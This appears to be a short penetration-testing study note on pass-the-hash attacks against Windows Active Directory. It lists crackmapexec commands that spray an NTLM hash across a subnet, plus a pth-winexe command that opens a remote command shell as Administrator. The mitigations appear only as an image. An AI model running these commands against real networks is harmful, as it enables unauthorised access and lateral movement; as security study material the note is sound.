- - - 
# What the hack is this? : 
Here we don't need to crack hashes for password then shell. 
Here we can can directly get a shell with hashes itself. ( **Yes it's True** ) 
![Imgur](https://i.imgur.com/DuYca15.jpg)

> [! NOTE ]
> But we can only perform this attack with NTLM hashes, This will not work with NTLMv2 hashes.


- - -
## Attacking Steps :

```sh
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -H <HASH>
cme smb 10.10.10.0/24 -u Thor -d Marvel.local -H <HASH> --local-auth
```

Then use this : [[_Active Directory/Gaining Shells/Basic]]

**OR TRY THIS** 

```sh
pth-winexe -U Administrator%<FULL-Hash>//10.11.0.22 cmd
```

- - -
### Mitigations :

![Imgur](https://i.imgur.com/UNH1U1J.png)

- - -

